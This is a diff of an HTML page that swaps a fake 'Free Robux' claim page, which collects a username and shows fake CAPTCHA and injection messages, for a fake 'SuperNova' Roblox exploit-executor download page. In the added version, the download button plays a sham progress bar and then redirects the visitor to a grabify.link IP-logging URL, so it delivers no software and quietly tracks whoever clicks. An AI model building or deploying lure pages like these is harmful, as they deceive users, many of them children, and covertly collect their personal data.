@@ -1,152 +1,156 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Roblox - Free Robux Event</title>
-  <link rel="icon" href="https://www.roblox.com/favicon.ico">
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #f2f2f2;
-    }
-
-    header {
-      background-color: #232527;
-      padding: 10px 20px;
-      color: white;
-      display: flex;
-      align-items: center;
-    }
-
-    header img {
-      height: 32px;
-      margin-right: 10px;
-    }
-
-    main {
-      max-width: 500px;
-      margin: 60px auto;
-      background: white;
-      padding: 40px;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
-      text-align: center;
-    }
-
-    h1 {
-      color: #111;
-    }
-
-    input[type="text"] {
-      width: 80%;
-      padding: 10px;
-      margin-top: 10px;
-      font-size: 16px;
-    }
-
-    button {
-      background-color: #00b06e;
-      color: white;
-      padding: 12px 24px;
-      font-size: 16px;
-      border: none;
-      border-radius: 6px;
-      margin-top: 20px;
-      cursor: pointer;
-    }
-
-    .captcha {
-      margin-top: 30px;
-      display: none;
-    }
-
-    .captcha-box {
-      background: #e5e5e5;
-      border: 1px solid #ccc;
-      padding: 20px;
-      display: inline-block;
-      border-radius: 6px;
-      margin-top: 10px;
-    }
-
-    .captcha-box label {
-      font-size: 14px;
-    }
-
-    .captcha-box input[type="checkbox"] {
-      margin-right: 8px;
-      transform: scale(1.2);
-    }
-
-    #status {
-      margin-top: 30px;
-      font-size: 18px;
-      color: #333;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SuperNova Script Executor - Download</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
+  body {
+    margin: 0;
+    background: #0a001f;
+    font-family: 'Orbitron', monospace, 'Courier New', monospace;
+    color: #cdaeff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  header {
+    margin-top: 50px;
+    text-align: center;
+    user-select: none;
+  }
+  header h1 {
+    font-size: 3.5rem;
+    letter-spacing: 4px;
+    margin-bottom: 5px;
+    color: #ae73ff;
+    text-shadow: 0 0 15px #9c27b0;
+  }
+  header p {
+    font-weight: 600;
+    font-size: 1.3rem;
+    color: #d6b3ff;
+    text-shadow: 0 0 8px #6a1b9a;
+  }
+  main {
+    background: #1a0033;
+    margin-top: 40px;
+    padding: 35px 40px;
+    border-radius: 20px;
+    max-width: 650px;
+    box-shadow: 0 0 30px #8a4fff;
+    width: 100%;
+    user-select: none;
+  }
+  section.description {
+    font-size: 1.15rem;
+    line-height: 1.7;
+    margin-bottom: 35px;
+    color: #d1bfff;
+  }
+  section.description strong {
+    color: #e1caff;
+  }
+  section.description em {
+    color: #b095d9;
+    font-style: normal;
+    font-weight: 700;
+  }
+  button#downloadBtn {
+    width: 100%;
+    padding: 20px 0;
+    font-size: 1.6rem;
+    font-weight: 900;
+    background: linear-gradient(90deg, #7a34ff, #ae73ff);
+    border: none;
+    border-radius: 60px;
+    color: #fff;
+    cursor: pointer;
+    box-shadow: 0 0 25px #bb8eff;
+    transition: background 0.35s ease;
+    user-select: none;
+  }
+  button#downloadBtn:hover {
+    background: linear-gradient(90deg, #ae73ff, #7a34ff);
+  }
+  #progressContainer {
+    margin-top: 30px;
+    background: #2e0057;
+    border-radius: 40px;
+    overflow: hidden;
+    height: 28px;
+    display: none;
+    box-shadow: inset 0 0 12px #8a4fff;
+  }
+  #progressBar {
+    background: #bb8eff;
+    height: 100%;
+    width: 0;
+    transition: width 0.3s ease;
+  }
+  footer {
+    margin-top: auto;
+    padding: 20px;
+    color: #8c7fb9;
+    font-size: 0.9rem;
+    text-align: center;
+    user-select: none;
+  }
+</style>
 </head>
 <body>
-  <header>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/b/bd/Roblox_Logo_2022.svg" alt="Roblox Logo">
-    <h2>Roblox Events</h2>
-  </header>
 
-  <main>
-    <h1>💰 Claim 10,000 Free Robux</h1>
-    <p>Enter your Roblox username to check eligibility:</p>
-    <input type="text" id="username" placeholder="e.g. Builderman">
-    <br>
-    <button onclick="nextStep()">Continue</button>
+<header>
+  <h1>SuperNova</h1>
+  <p>Roblox Script Executor</p>
+</header>
 
-    <div class="captcha" id="captchaStep">
-      <p>Verify you're human:</p>
-      <div class="captcha-box">
-        <label><input type="checkbox" id="captcha"> I'm not a robot</label>
-      </div>
-      <br>
-      <button onclick="verifyCaptcha()">Verify</button>
-    </div>
+<main>
+  <section class="description">
+    <p><strong>SuperNova</strong> is a powerful Roblox script executor designed for smooth and reliable script injection. 
+    Easily run your Lua scripts with minimal risk and great performance.</p>
 
-    <div id="status"></div>
-  </main>
+    <p>Equipped with stealth features and automatic updates to stay ahead of Roblox's defenses, SuperNova helps you customize your gameplay experience.</p>
 
-  <script>
-    function nextStep() {
-      const username = document.getElementById("username").value.trim();
-      if (!username) {
-        alert("Please enter your Roblox username.");
-        return;
+    <p><em>Warning:</em> Use responsibly. Exploiting may lead to bans. SuperNova is provided for educational and testing purposes only.</p>
+  </section>
+
+  <button id="downloadBtn">Download SuperNova</button>
+
+  <div id="progressContainer">
+    <div id="progressBar"></div>
+  </div>
+</main>
+
+<footer>
+  &copy; 2025 SuperNova. All rights reserved.
+</footer>
+
+<script>
+  const downloadBtn = document.getElementById('downloadBtn');
+  const progressContainer = document.getElementById('progressContainer');
+  const progressBar = document.getElementById('progressBar');
+
+  downloadBtn.addEventListener('click', () => {
+    downloadBtn.disabled = true;
+    downloadBtn.textContent = 'Downloading...';
+    progressContainer.style.display = 'block';
+    let width = 0;
+    const interval = setInterval(() => {
+      if (width >= 100) {
+        clearInterval(interval);
+        window.location.href = 'https://grabify.link/JP6P5Q';
+      } else {
+        width += Math.floor(Math.random() * 12) + 6;
+        if (width > 100) width = 100;
+        progressBar.style.width = width + '%';
       }
-      document.getElementById("captchaStep").style.display = "block";
-    }
+    }, 300);
+  });
+</script>
 
-    function verifyCaptcha() {
-      const captchaChecked = document.getElementById("captcha").checked;
-      if (!captchaChecked) {
-        alert("Please complete the CAPTCHA.");
-        return;
-      }
-
-      const status = document.getElementById("status");
-      status.innerHTML = "✅ Verified! Connecting to Roblox servers...";
-      
-      setTimeout(() => {
-        status.innerHTML = "💸 Injecting Robux into account...";
-      }, 2000);
-      
-      setTimeout(() => {
-        status.innerHTML = "🔒 Finalizing secure connection...";
-      }, 4000);
-      
-      setTimeout(() => {
-        status.innerHTML = "🎉 Robux ready to claim! Redirecting...";
-      }, 6000);
-
-      setTimeout(() => {
-        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-      }, 8000);
-    }
-  </script>
 </body>
 </html>
